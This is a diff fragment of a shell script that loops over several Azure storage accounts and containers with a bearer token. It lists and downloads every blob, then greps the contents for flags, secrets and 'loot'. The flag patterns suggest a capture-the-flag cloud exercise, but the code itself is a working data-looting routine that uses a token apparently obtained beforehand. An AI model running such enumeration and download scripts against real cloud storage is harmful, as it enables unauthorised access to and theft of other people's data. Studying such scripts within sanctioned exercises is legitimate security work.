@@ -24,5 +24,6 @@ for A in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttb
       case "$B" in BLOBS=*) echo "$B";; "") ;; *) echo "READ $CNAME/$B"; curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/$CNAME/$B" -o /tmp/blob_scan; grep -aoiE '.{0,80}(DF26\{|flag\{|ctf|secret|loot|TBL\{|the flag).{0,160}' /tmp/blob_scan | head -20;; esac
     done
   done
-done`necho "=== RAW BLOB XML ==="
+done
+echo "=== RAW BLOB XML ==="
 for A in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do for CNAME in config exports logs; do echo "RAW $A/$CNAME"; curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/$CNAME?restype=container&comp=list" | head -c 2000; echo; done; done
